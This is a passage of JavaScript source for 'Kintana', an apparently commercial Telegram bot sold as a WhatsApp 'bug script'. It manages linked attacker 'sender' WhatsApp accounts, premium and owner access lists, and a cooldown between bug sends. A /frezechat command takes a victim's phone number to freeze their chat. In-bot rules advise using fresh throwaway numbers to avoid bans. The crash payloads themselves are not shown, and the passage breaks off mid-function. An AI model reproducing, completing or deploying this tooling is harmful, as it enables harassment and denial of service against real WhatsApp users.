      caption = `<blockquote>ᴘʀᴇᴍɪᴜᴍ ᴀɴᴅ ᴀᴅᴍɪɴ ᴀᴄᴄᴇss ᴍᴇɴᴜ, ᴘʟᴇᴀsᴇ ʀᴇɢɪsᴛᴇʀ ᴛᴏ ʙᴇ ᴀʙʟᴇ ᴛᴏ ᴜsᴇ ᴛʜᴇ ʙᴜɢ</blockquote>

<blockquote>=== ᴄᴏɴɴᴇᴄᴛ ᴍᴇɴᴜ ===</blockquote>
/addsenderpublic - ᴀᴅᴅ sᴇɴᴅᴇʀ ᴘᴜʙʟɪᴄ
/addsenderprivat - ᴀᴅᴅ sᴇɴᴅᴇʀ ᴘʀɪᴠᴀᴛᴇ
/delsenderpublic - ᴅᴇʟᴇᴛᴇᴅ sᴇɴᴅᴇʀ ᴘᴜʙʟɪᴄ
/delsenderprivat - ᴅᴇʟᴇᴛᴇᴅ sᴇɴᴅᴇʀ ᴘʀɪᴠᴀᴛ
/listsenderpublic - ʟɪsᴛ sᴇɴᴅᴇʀ ᴘᴜʙʟɪᴄ
/listsenderprivat - ʟɪsᴛ sᴇɴᴅᴇʀ ᴘʀɪᴠᴀᴛᴇ
/listsender - ʟɪsᴛ sᴇɴᴅᴇʀ ᴀʟʟ
=====================
<blockquote>=== ɢʀᴏᴜᴘ ᴍᴜʀʙᴜɢ ᴀᴅᴅ ===</blockquote>
/modemurbuggb - ᴏɴ - ᴏғғ (ᴀᴅᴍɪɴ ᴏɴʟʏ)
=====================
<blockquote>=== sᴇᴄᴜʀɪᴛʏ ===</blockquote>
/blockcmd - ᴏɴ - ᴏғғ (ᴏᴡɴᴇʀ ᴏɴʟʏ)
<blockquote>=== ᴀᴄᴄsᴇs ᴍᴇɴᴜ ===</blockquote>
/addsender - ɴᴜᴍʙᴇʀ
/delsender - ɴᴜᴍʙᴇʀ
/addowner - ɪᴅ ᴜsᴇʀ
/delowner - ɪᴅ ᴜsᴇʀ
/addprem - ɪᴅ ᴜsᴇʀ
/delprem - ɪᴅ ᴜsᴇʀ
/listprem - ʟɪsᴛ ᴘʀᴇᴍɪᴜᴍ
/listowner - ʟɪsᴛ ᴏᴡɴᴇʀ
/setjeda - sᴇᴛᴛɪɴɢ ᴊᴇᴅᴀ ᴘᴀᴅᴀ ғɪᴛᴜʀ ʙᴜɢ
=====================`;
      replyMarkup = { inline_keyboard: [[{ text: "ɪɴғᴏ sᴄʀɪᴘᴛ", url: "https://t.me/KintanaOfficial", style: "success", icon_custom_emoji_id: "5316826301611390284" }, { text: "ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", callback_data: "back_to_main", style: "success", icon_custom_emoji_id: "5316692783963060623" }]] };
    }
    
    if (query.data === "bug_info") {
      caption = `<blockquote>sᴇʙᴇʟᴜᴍ ᴘᴀᴋᴀɪ ғɪᴛᴜʀ ʙᴜɢ,ᴡᴀᴊɪʙ ʙᴀᴄᴀ ɪɴɪ ᴅᴜʟᴜ ʙɪᴀʀ ɢᴀ ᴋᴇsᴀʟᴀʜᴀɴ ᴘᴀᴋᴀɪ.</blockquote><blockquote>ᴀᴛᴜʀᴀɴ</blockquote>
      
• ᴊᴀɴɢᴀɴ ʙᴜɢ ɴᴏᴍᴏʀ ᴀsᴀʟ,ᴛᴇʀᴜᴛᴀᴍᴀ ᴋᴀʟᴏ ᴛᴀʀɢᴇᴛ ɢᴀᴋ ʙᴇʀsᴀʟᴀʜ.
• ʜɪɴᴅᴀʀɪ sᴇɴᴅᴇʀ/ɴᴏᴋᴏs ʙᴀʀᴜ (ғʀᴇᴇ),ᴋᴀʀᴇɴᴀ ʀᴀᴡᴀɴ ᴋᴇ ʟɪᴍɪᴛ/ʙʟᴏᴋɪʀ.
• ᴊᴀɴɢᴀɴ sᴘᴀᴍ ʙᴜɢ ʙᴇʀʟᴇʙɪʜᴀɴ.
• ɢᴜɴᴀᴋᴀɴ /sᴇᴛᴊᴇᴅᴀ ʙɪᴀʀ ᴘʀᴏsᴇs ʟᴇʙɪʜ ʟᴀɴᴄᴀʀ.
• ᴘʀɪᴏʀɪᴛᴀsᴋᴀɴ ɴᴏᴍᴏʀ ᴏʟᴅ/ʏᴀɴɢ sᴛᴀʙɪʟ. ᴋᴜᴀᴛ ɴᴏᴍᴏʀɴʏᴀ,ᴍᴀᴋɪɴ ᴏᴘᴛɪᴍᴀʟ.

<blockquote>ᴋᴀʟᴏ ᴇʀʀᴏʀ</blockquote>
• ɢᴀ ʙɪsᴀ ᴘᴀɪʀɪɴɢ/ᴍᴇɴᴀᴜᴛᴋᴀɴ ɴᴏᴍᴏʀ → ᴄᴏʙᴀ ɴᴏᴍᴏʀ ʟᴀɪɴ ʏᴀɴɢ ᴍᴀsɪʜ sᴛᴀʙɪʟ.
• ʙᴜɢ ɢᴀ ᴍᴇᴍᴘᴀɴ → ᴄᴇᴋ ᴅᴜʟᴜ ᴋᴏɴᴅɪsɪ ᴛᴀʀɢᴇᴛ. ʙɪsᴀ ᴊᴀᴅɪ ᴛᴀʀɢᴇᴛ ᴋᴜᴀᴛ ᴀᴛᴀᴜ sᴇɴᴅᴇʀ ᴋᴀᴍᴜ ʏᴀɴɢ sᴇᴅᴀɴɢ ʟɪᴍɪᴛ.
• ᴋᴀʟᴏ ɴᴏᴍᴏʀ ᴋᴀᴍᴜ ᴀᴍᴀɴ ᴛᴀᴘɪ ᴍᴀsɪʜ ʙᴇʀᴍᴀsᴀʟᴀʜ → ʜᴜʙᴜɴɢɪ @heysaka ᴜɴᴛᴜᴋ ᴍᴇɴɢᴇᴄᴇᴋ sᴄʀɪᴘᴛ ɴʏᴀ

ᴊᴀɴɢᴀɴ ᴍɪɴᴜs ʟɪᴛᴇʀᴀsɪ ʏᴀʜ ᴄᴜʏ 😉
=====================`;
      replyMarkup = { inline_keyboard: [[{ text: "ɪɴғᴏ sᴄʀɪᴘᴛ", url: "https://t.me/KintanaOfficial", style: "success", icon_custom_emoji_id: "5316826301611390284" }, { text: "ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", callback_data: "kintana-menu", style: "success", icon_custom_emoji_id: "5316692783963060623" }]] };
    }
    
    // ===== ALL MENU =====
    if (query.data === "all_menu") {
      caption = `<blockquote>ᴀʟʟ ᴍᴇɴᴜ ᴄᴏɴᴛᴀɪɴs ᴀʟʟ ᴛʜᴇ ꜰᴇᴀᴛᴜʀᴇꜱ ᴀᴠᴀɪʟᴀʙʟᴇ ɪɴ ᴛʜɪꜱ ʙᴏᴛ</blockquote>

<blockquote>=== ᴛᴏᴏʟs ᴍᴇɴᴜ ===</blockquote>
/info - ᴄᴇᴋ ɪᴅ ᴛᴇʟᴇɢʀᴀᴍ
/tourl - ᴍᴇɴɢᴜʙᴀʜ ᴍᴇᴅɪᴀ ᴍᴇɴᴊᴀᴅɪ ᴜʀʟ
/cekfunc - ᴍᴇɴɢᴇᴄᴇᴋ ғᴜɴᴄᴛɪᴏɴ ʙᴜɢ
/tiktok - ᴛɪᴋᴛᴏᴋ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ!
/pinterest - sᴇᴀʀᴄʜ ᴘɪɴᴛᴇʀᴇsᴛ
=====================
<blockquote>=== ғᴜɴ ᴍᴇɴᴜ ===</blockquote>
/brat - ʙᴜᴀᴛ sᴛɪᴋᴇʀ ʙʀᴀᴛ
/play - ᴍᴇɴᴄᴀʀɪ ʏᴏᴜᴛᴜʙᴇ ᴍᴜsɪᴄ
/jadihitam - ᴜʙᴀʜ ᴋᴜʟɪᴛ ᴍᴇɴᴊᴀᴅɪ ʜɪᴛᴀᴍ
/jadianime - ᴜʙᴀʜ ғᴏᴛᴏ ᴍᴇɴᴊᴀᴅɪ ᴀɴɪᴍᴇ
/stalkff - sᴛᴀʟᴋɪɴɢ ᴀᴄᴄᴏᴜɴᴛ ғʀᴇᴇ ғɪʀᴇ
/iqc - ɪᴘʜᴏɴᴇ ǫᴜᴏᴛᴇs ᴡʜᴀᴛsᴀᴘᴘ
=====================`;
      replyMarkup = { inline_keyboard: [[{ text: "ɪɴғᴏ sᴄʀɪᴘᴛ", url: "https://t.me/KintanaOfficial", style: "success", icon_custom_emoji_id: "5316826301611390284" }, { text: "ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", callback_data: "back_to_main", style: "success", icon_custom_emoji_id: "5316692783963060623" }]] };
    }

    // ===== KINTANA MENU =====
    if (query.data === "kintana-menu") {
      const { caption: kintanaCaption, replyMarkup: kintanaReplyMarkup } = getKintanaMenu();
      caption = kintanaCaption;
      replyMarkup = kintanaReplyMarkup;
    }

    // ===== TOGGLE PUBLIC =====
    if (query.data === "toggle_public") {
      senderPublicEnabled = !senderPublicEnabled;
      await bot.answerCallbackQuery(query.id, { text: `Sender Public ${senderPublicEnabled ? "ON" : "OFF"}`, show_alert: false });
      const { caption: kintanaCaption, replyMarkup: kintanaReplyMarkup } = getKintanaMenu();
      caption = kintanaCaption;
      replyMarkup = kintanaReplyMarkup;
    }

    // ===== TOGGLE PRIVATE =====
    if (query.data === "toggle_private") {
      senderPrivateEnabled = !senderPrivateEnabled;
      await bot.answerCallbackQuery(query.id, { text: `Sender Private ${senderPrivateEnabled ? "ON" : "OFF"}`, show_alert: false });
      const { caption: kintanaCaption, replyMarkup: kintanaReplyMarkup } = getKintanaMenu();
      caption = kintanaCaption;
      replyMarkup = kintanaReplyMarkup;
    }

    // ===== THANKS TO =====
    if (query.data === "thanks_to") {
      caption = `<blockquote>ᴛʜᴀɴᴋs ᴛᴏ ғᴏʀ</blockquote>

<blockquote>=== ᴛʜᴀɴᴋs ᴛᴏ ===</blockquote>
ᴄʀᴇᴀᴛᴏʀ : ʜᴇʏsᴀᴋᴀ ᴏғғɪᴄɪᴀʟ ɪᴅ
ғʀɪᴇɴᴅ : ɴɪᴇʟ
ғʀɪᴇɴᴅ : ʙᴜʏᴇʀ ᴋɪɴᴛᴀɴᴀ

<blockquote>ᴀɴᴅ ᴛᴏ ᴀʟʟ ᴋɪɴᴛᴀɴᴀ ꜱᴄʀɪᴘᴛ ᴜꜱᴇʀꜱ, ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ʏᴏᴜʀ ꜱᴜᴘᴘᴏʀᴛ</blockquote>
=====================`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "ɪɴғᴏ sᴄʀɪᴘᴛ", url: "https://t.me/KintanaOfficial", style: "success", icon_custom_emoji_id: "5316826301611390284" }],
          [{ text: "ɪɴsᴛᴀɢʀᴀᴍ", url: "https://instagram.com/@sakaurbans", style: "success", icon_custom_emoji_id: "5316553695742147732" }, { text: "ʏᴏᴜᴛᴜʙᴇ", url: "https://youtube.com/@gwsaka", style: "success", icon_custom_emoji_id: "5316567469702264826" }],
          [{ text: "ᴛᴇʟᴇɢʀᴀᴍ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5316823376738663082" }],
          [{ text: "ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", callback_data: "back_to_main", style: "success", icon_custom_emoji_id: "5316692783963060623" }]
        ]
      };
    }

    // ===== BACK TO MAIN =====
    if (query.data === "back_to_main") {
      caption = `<blockquote>${greeting} ${username} ɪ ᴀᴍ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ʙᴜɢ sᴄʀɪᴘᴛ ᴋɪɴᴛᴀɴᴀ ᴠᴇʀsɪᴏɴ 𝟹 ɴᴇᴡ ᴄʀᴇᴀᴛᴇ ʙʏ ʜᴇʏsᴀᴋᴀ</blockquote>

<blockquote>=== ꆰ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ===</blockquote>
ꆰ ɴᴀᴍᴇ ᴄʀᴇᴀᴛᴏʀ : ʜᴇʏsᴀᴋᴀ ᴏғғɪᴄɪᴀʟ ɪᴅ
ꆰ ᴠᴇʀsɪᴏɴ : 𝟾.𝟶.𝟶
ꆰ sᴘᴇᴄɪᴀʟ ᴛʜᴇᴍᴇ : ᴏɴᴇ ᴘɪᴇᴄᴇ ᴇᴅɪᴛɪᴏɴs
ꆰ ʙᴏᴛ ɴᴀᴍᴇ : ᴋɪɴᴛᴀɴᴀ
ꆰ ʀᴜɴᴛɪᴍᴇ : ${runtime}
ꆰ sᴛᴀᴛᴜs : ${premiumStatus}
==================

<blockquote>ᴘʟᴇᴀsᴇ ᴜsᴇ ɪᴛ ᴀs ᴡɪsᴇʟʏ ᴀs ᴘᴏssɪʙʟᴇ, ᴅᴏɴ'ᴛ ᴅɪsᴛᴜʀʙ ɪɴɴᴏᴄᴇɴᴛ ᴘᴇᴏᴘʟᴇ</blockquote>`;
      replyMarkup = {
        inline_keyboard: [
          [{ text: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ", callback_data: "owner_menu", style: "success", icon_custom_emoji_id: "5352670019899652428" }, { text: "ᴀʟʟ ᴍᴇɴᴜ", callback_data: "all_menu", style: "success", icon_custom_emoji_id: "5316977664848837418" }], 
          [{ text: "ᴋɪɴᴛᴀɴᴀ ᴍᴇɴᴜ", callback_data: "kintana-menu", style: "success", icon_custom_emoji_id: "6044182530767196926" }],
          [{ text: "ᴛʜᴀɴᴋs ᴛᴏ", callback_data: "thanks_to", style: "success", icon_custom_emoji_id: "5316731584697613423" }],
          [{ text: "sᴀʟᴜʀᴀɴ", url: "https://t.me/KintanaOfficial", style: "success", icon_custom_emoji_id: "5316826301611390284" }, { text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }],
          [{ text: "ʙᴜʏ sᴄʀɪᴘᴛ", url: "https://t.me/kintanaoffcbot", style: "success", icon_custom_emoji_id: "5316924123786524990" }]
        ]
      };
    }

    // ===== EDIT MESSAGE (caption only) =====
    await bot.editMessageCaption(
      caption,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);

  } catch (error) {
    console.error("Error handling callback query:", error);
    try {
      await bot.answerCallbackQuery(query.id, { text: "Terjadi kesalahan: " + error.message, show_alert: true });
    } catch (e) {}
  }
});

bot.onText(/\/(addsenderpublic|addsenderprivat)(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const command = match[1];
  const type = command === "addsenderpublic" ? "public" : "private";
  const userId = msg.from.id;
  const idgc = String(chatId); 

    if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴄᴄsᴇs ᴏʟᴇʜ ᴏᴡɴᴇʀ</b></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  const input = match[2];
  if (!input) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>[!] ᴍɪssɪɴɢ ɪɴᴘᴜᴛ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ɴᴜᴍʙᴇʀ.\nᴇxᴀᴍᴘʟᴇ : /${command} 𝟼𝟸𝟾𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿</b></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  const botNumber = input.replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId, type, userId);
  } catch (error) {
    console.error(`Error in ${command}:`, error);
    bot.sendMessage(
      chatId,
      `<blockquote><b>[!] ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ sᴀᴀᴛ ᴍᴇɴɢʜᴜʙᴜɴɢᴋᴀɴ ᴋᴇ ᴡʜᴀᴛsᴀᴘᴘ. sɪʟᴀᴋᴀɴ ᴄᴏʙᴀ ʟᴀɢɪ.</b></blockquote>`,
      { parse_mode: "HTML" }
    );
  }
});

bot.onText(/\/(delsenderpublic|delsenderprivat)(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const command = match[1];
  const targetType = command === "delsenderpublic" ? "public" : "private";
  const userId = msg.from.id;
  const idgc = String(chatId); 

    if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴄᴄsᴇs ᴏʟᴇʜ ᴏᴡɴᴇʀ</b></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  const input = match[2];
  if (!input) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>[!] ᴍɪssɪɴɢ ɪɴᴘᴜᴛ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ɴᴜᴍʙᴇʀ.\nᴇxᴀᴍᴘʟᴇ : /${command} 𝟼𝟸𝟾𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿</b></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  const botNumber = input.replace(/[^0-9]/g, "");

  let statusMessage = await bot.sendMessage(
    chatId,
    `<blockquote><b>╭─────────────────
│    ᴍᴇɴɢʜᴀᴘᴜs ʙᴏᴛ (${targetType.toUpperCase()})    
│────────────────
│ ʙᴏᴛ: ${botNumber}
│ sᴛᴀᴛᴜs: ᴍᴇᴍᴘʀᴏsᴇs...
╰─────────────────</b></blockquote>`,
    { parse_mode: "HTML" }
  );

  try {
    const sessionData = sessions.get(botNumber);

    if (sessionData) {
      if (sessionData.type !== targetType) {
        return await bot.editMessageText(
          `<blockquote><b>╭─────────────────
│    ᴇʀʀᴏʀ    
│────────────────
│ ʙᴏᴛ: ${botNumber}
│ sᴛᴀᴛᴜs: ʙᴏᴛ ɪɴɪ ᴀᴅᴀʟᴀʜ sᴇɴᴅᴇʀ ${sessionData.type.toUpperCase()}!
│ ᴄᴀᴛᴀᴛᴀɴ: ɢᴜɴᴀᴋᴀɴ /delsender${sessionData.type}
╰─────────────────</b></blockquote>`,
          {
            chat_id: chatId,
            message_id: statusMessage.message_id,
            parse_mode: "HTML",
          }
        );
      }

      // Logout socket
      const sock = sessionData.sock;
      try {
        await sock?.logout();
      } catch (err) {
        console.error("Error logging out socket:", err);
      }

      sessions.delete(botNumber);

      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }

      removeActiveSession(botNumber);

      await bot.editMessageText(
        `<blockquote><b>╭─────────────────
│    ʙᴏᴛ ᴅɪʜᴀᴘᴜs   
│────────────────
│ ʙᴏᴛ: ${botNumber}
│ ᴛʏᴘᴇ: ${targetType.toUpperCase()}
│ sᴛᴀᴛᴜs: ʙᴇʀʜᴀsɪʟ ᴅɪʜᴀᴘᴜs!
╰─────────────────</b></blockquote>`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "HTML",
        }
      );
    } else {
      await bot.editMessageText(
        `<blockquote><b>╭─────────────────
│    ᴇʀʀᴏʀ    
│────────────────
│ ʙᴏᴛ: ${botNumber}
│ sᴛᴀᴛᴜs: ʙᴏᴛ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ!
╰─────────────────</b></blockquote>`,
        {
          chat_id: chatId,
          message_id: statusMessage.message_id,
          parse_mode: "HTML",
        }
      );
    }
  } catch (error) {
    console.error("Error deleting bot:", error);
    await bot.editMessageText(
      `<blockquote><b>╭─────────────────
│    ᴇʀʀᴏʀ    
│────────────────
│ ʙᴏᴛ: ${botNumber}
│ sᴛᴀᴛᴜs: ${error.message}
╰─────────────────</b></blockquote>`,
      {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "HTML",
      }
    );
  }
});
//============================//
// ============================================
const JEDA_PATH = path.join(__dirname, 'jeda.json');

function loadConfig() {
    try {
        if (fs.existsSync(JEDA_PATH)) {
            const data = fs.readFileSync(JEDA_PATH, 'utf8');
            return JSON.parse(data);
        }
    } catch (error) {
        console.log('❌ Error loading config:', error);
    }
    return { delayMs: 0, lastBugTime: 0 };
}

function saveConfig(config) {
    try {
        fs.writeFileSync(JEDA_PATH, JSON.stringify(config, null, 2));
        console.log('✅ Config saved to jeda.json');
    } catch (error) {
        console.log('❌ Error saving config:', error);
    }
}

let jedalohyah = loadConfig();
let delayMs = jedalohyah.delayMs || 0;
let lastBugTime = jedalohyah.lastBugTime || 0;

console.log(`📊 Loaded delay: ${delayMs}ms`);

function getCurrentDelay() {
    return delayMs;
}

function updateDelay(newDelay) {
    delayMs = newDelay;
    jedalohyah.delayMs = newDelay;
    saveConfig(jedalohyah);
}

function updateLastBugTime() {
    lastBugTime = Date.now();
    jedalohyah.lastBugTime = lastBugTime;
    saveConfig(jedalohyah);
}

function getRemainingTime() {
    const elapsed = Date.now() - lastBugTime;
    const remaining = delayMs - elapsed;
    return remaining > 0 ? remaining : 0;
}

function formatDelay(ms) {
    if (ms === 0) return 'ᴛᴀɴᴘᴀ ᴊᴇᴅᴀ';
    const seconds = ms / 1000;
    if (seconds < 60) return `${seconds}s`;
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = Math.round(seconds % 60);
    if (remainingSeconds === 0) return `${minutes}m`;
    return `${minutes}m ${remainingSeconds}s`;
}

bot.onText(/\/setjeda(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴄᴄsᴇs ᴏʟᴇʜ ᴏᴡɴᴇʀ</b></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>[!] ᴍɪssɪɴɢ ɪɴᴘᴜᴛ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴛʜᴇ ᴛɪᴍᴇ.\nᴇxᴀᴍᴘʟᴇ : /sᴇᴛᴊᴇᴅᴀ 5s (ᴅᴇᴛɪᴋ), /sᴇᴛᴊᴇᴅᴀ 2ᴍ (ᴍᴇɴɪᴛ), /sᴇᴛᴊᴇᴅᴀ 1ʜ (ᴊᴀᴍ)</b></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  const input = match[1].toLowerCase().trim();
  const timeUnit = input.slice(-1);
  const timeValue = parseInt(input.slice(0, -1));

  if (isNaN(timeValue) || !['s', 'm', 'h'].includes(timeUnit)) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>[!] ғᴏʀᴍᴀᴛ sᴀʟᴀʜ! ᴄᴏɴᴛᴏʜ: /sᴇᴛᴊᴇᴅᴀ 5s, /sᴇᴛᴊᴇᴅᴀ 2ᴍ, ᴀᴛᴀᴜ /sᴇᴛᴊᴇᴅᴀ 1ʜ</b></blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  let newDelay = 0;
  if (timeUnit === 's') newDelay = timeValue * 1000;
  if (timeUnit === 'm') newDelay = timeValue * 60 * 1000;
  if (timeUnit === 'h') newDelay = timeValue * 60 * 60 * 1000;

  updateDelay(newDelay);
  updateLastBugTime();

  await bot.sendMessage(
    chatId,
    `<blockquote><b>✅ ʙᴇʀʜᴀsɪʟ sᴇᴛ ᴊᴇᴅᴀ ᴍᴇɴᴊᴀᴅɪ ${input}</b>\n<b>⏱️ ${formatDelay(delayMs)}</b>\n<b>📁 sɪᴍᴘᴀɴ ᴅɪ jeda.json</b>\n<b>📌 ᴛᴜɴɢɢᴜ ${formatDelay(delayMs)} sᴇʙᴇʟᴜᴍ ʙɪsᴀ ʙᴜɢ ʟᴀɢɪ</b></blockquote>`,
    { parse_mode: "HTML" }
  );
});

bot.onText(/\/cekjeda/, async (msg) => {
  const chatId = msg.chat.id;
  
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴄᴄsᴇs ᴏʟᴇʜ ᴏᴡɴᴇʀ</b></blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const remaining = getRemainingTime();
  let status = '✅ sɪᴀᴘ ᴅɪɢᴜɴᴀᴋᴀɴ';
  if (remaining > 0) {
    status = `⏳ ᴛᴜɴɢɢᴜ ${formatDelay(remaining)} ʟᴀɢɪ`;
  }

  await bot.sendMessage(
    chatId,
    `<blockquote><b>📊 ɪɴғᴏ ᴊᴇᴅᴀ sᴀᴀᴛ ɪɴɪ</b>\n
╭────────────────
│<b>⏱️ ᴊᴇᴅᴀ</b>: ${formatDelay(delayMs)}
│<b>📏 ᴅᴀʟᴀᴍ ᴍs</b>: ${delayMs}ms
│<b>📁 sɪᴍᴘᴀɴ ᴅɪ</b>: jeda.json
│<b>📌 sᴛᴀᴛᴜs</b>: ${status}
╰────────────────</blockquote>`,
    { parse_mode: "HTML" }
  );
});

bot.onText(/\/resetjeda/, async (msg) => {
  const chatId = msg.chat.id;
  
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴄᴄsᴇs ᴏʟᴇʜ ᴏᴡɴᴇʀ</b></blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  updateDelay(0);
  updateLastBugTime();
  await bot.sendMessage(
    chatId,
    `<blockquote><b>✅ ᴊᴇᴅᴀ ʙᴇʀʜᴀsɪʟ ᴅɪʀᴇsᴇᴛ ᴋᴇ 0 (ᴛᴀɴᴘᴀ ᴊᴇᴅᴀ)</b></blockquote>`,
    { parse_mode: "HTML" }
  );
});

bot.onText(/\/(frezechat)(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId); 

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴄᴄsᴇs ᴜsᴇʀ ᴘʀᴇᴍɪᴜᴍ</b></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  if (!match[2]) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>[!] ᴍɪssɪɴɢ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ɴᴜᴍʙᴇʀ.\nᴇxᴀᴍᴘʟᴇ : /frezechar 628123456789</b></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  const [targetNumber] = match[2].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    let allSessions = Array.from(sessions.entries());

    allSessions = allSessions.filter(([_, data]) => {
      if (data.type === "public") {
        return true; 
      }
      if (data.type === "private") {
        return data.ownerId === userId; 
      }
      return false;
    });

    if (allSessions.length === 0) {
      let errorMsg = `<blockquote><b>[!] ᴛɪᴅᴀᴋ ᴀᴅᴀ ʙᴏᴛ`;
      errorMsg += ` (ᴘᴜʙʟɪᴄ ᴀᴛᴀᴜ ᴘʀɪᴠᴀᴛᴇ ᴍɪʟɪᴋ ᴀɴᴅᴀ)`;
      errorMsg += ` ᴛᴇʀʜᴜʙᴜɴɢ. ɢᴜɴᴀᴋᴀɴ /ᴀᴅᴅsᴇɴᴅᴇʀᴘᴜʙʟɪᴄ ᴀᴛᴀᴜ /ᴀᴅᴅsᴇɴᴅᴇʀᴘʀɪᴠᴀᴛ`;
